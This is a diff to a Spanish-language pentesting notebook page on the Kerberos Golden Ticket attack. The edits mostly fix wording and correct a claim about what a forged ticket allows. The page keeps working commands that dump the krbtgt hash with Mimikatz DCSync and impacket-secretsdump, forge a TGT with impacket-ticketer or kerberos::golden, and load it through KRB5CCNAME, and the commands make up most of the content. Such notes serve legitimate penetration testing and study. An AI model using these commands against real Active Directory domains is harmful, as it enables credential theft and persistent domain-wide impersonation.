@@ -35,17 +35,17 @@
 
             <p>Golden Ticket permite crear TGTs arbitrarios si se dispone del hash de krbtgt y el SID del dominio.</p>
 
-            <p><span class="notebook-review-note">Aviso: <code>Kerberos Golden Ticket</code> permite crear tickets <code>TGT</code> de cualquier usuario del dominio y actuar como un DC</span></p>
-            <p>- <code>Requisitos</code>: hash NTLM de  <code>krbtgt</code> y <code>SID del dominio</code></p>
-            <h2>hash krbtgt</h2>
+            <p><span class="notebook-review-note">Aviso: <code>Kerberos Golden Ticket</code> permite forjar tickets <code>TGT</code> válidos para el dominio usando la clave de <code>krbtgt</code>; no convierte al atacante en DC, pero sí permite autenticarse como usuarios arbitrarios si el ticket se construye correctamente.</span></p>
+            <p>- <code>Requisitos</code>: hash NTLM de <code>krbtgt</code> y <code>SID del dominio</code></p>
+            <h2>Hash krbtgt</h2>
             <section class="code-card">
-              <h3>Windows Mimikatz: Dumpear hash de krbtgt</h3>
+              <h3>Windows Mimikatz: Volcar hash de krbtgt</h3>
               <pre><code>mimikatz.exe
 lsadump::dcsync /domain:&lt;domain&gt;.&lt;domain&gt; /user:krbtgt
 # hash NTLM krbtgt: krbtgt:rid:LM:NT -&gt; Necesitamos el hash NT</code></pre>
             </section>
             <section class="code-card">
-              <h3>Kali: Dumpear hash de krbtgt</h3>
+              <h3>Kali: Volcar hash de krbtgt</h3>
               <pre><code>impacket-secretsdump &lt;user&gt;:&lt;pass&gt;@&lt;ip_dc&gt; -just-dc-ntlm
 # hash NTLM krbtgt: krbtgt:rid:LM:NT -&gt; Necesitamos el hash NT</code></pre>
             </section>
@@ -67,7 +67,7 @@ nxc ldap &lt;ip_dc&gt; -u &lt;user&gt; -p &lt;pass&gt; --get-sid
             <h2>Crear Ticket</h2>
             <section class="code-card">
               <h3>Crear ticket TGT</h3>
-              <pre><code># Poner user_random un usuario que no exista o Administrator (Dominio solo válida tickets y no valida usuarios)
+              <pre><code># Poner user_random un usuario que no exista o Administrator. El dominio valida el ticket Kerberos; el usuario no tiene por qué existir si el PAC y los datos del ticket son aceptados.
 impacket-ticketer -nthash &lt;hash_krbtgt&gt; -domain-sid &lt;SID&gt; -domain &lt;dominio&gt; &lt;user_random&gt;
 # Se genera el ticket &lt;user_random&gt;.ccache y exportamos el ticket a la variable de entorno
 export KRB5CCNAME=/home/path_to/&lt;user_random&gt;.ccache
@@ -84,14 +84,14 @@ kerberos::golden /domain:&lt;domain&gt;.&lt;domain&gt; /sid:&lt;SID&gt; /rc4:&lt
 # Listar Ticket en la sesión actual
 klist</code></pre>
             </section>
-            <p>- <code>/domain</code>:El nombre del dominio.</p>
-            <p>- <code>/sid</code>:El valor SID del dominio.</p>
-            <p>- <code>/rc4</code>:El hash de la contraseña de <code>krbtgt</code>.</p>
-            <p>- <code>/user</code>:El nombre de usuario para el cual se emitirá el ticket</p>
-            <p>- <code>/id</code>:ID relativo (última parte de <code>SID</code>) del usuario para quien se emitirá el ticket.</p>
-            <p>- <code>/renewmax</code>:El número máximo de días que se puede renovar el ticket.</p>
-            <p>- <code>/endin</code>:Fin de la vida útil del ticket.</p>
-            <p>- <code>/ptt</code>: Pasa el Ticket a la sesión actual</p>
+            <p>- <code>/domain</code>: el nombre del dominio.</p>
+            <p>- <code>/sid</code>: el valor SID del dominio.</p>
+            <p>- <code>/rc4</code>: el hash NTLM de <code>krbtgt</code>.</p>
+            <p>- <code>/user</code>: el nombre de usuario para el cual se emitirá el ticket.</p>
+            <p>- <code>/id</code>: ID relativo (última parte de <code>SID</code>) del usuario para quien se emitirá el ticket.</p>
+            <p>- <code>/renewmax</code>: el número máximo de días que se puede renovar el ticket.</p>
+            <p>- <code>/endin</code>: fin de la vida útil del ticket.</p>
+            <p>- <code>/ptt</code>: pasa el ticket a la sesión actual.</p>
 
             <h2>Tags</h2>
             <div class="tag-list">
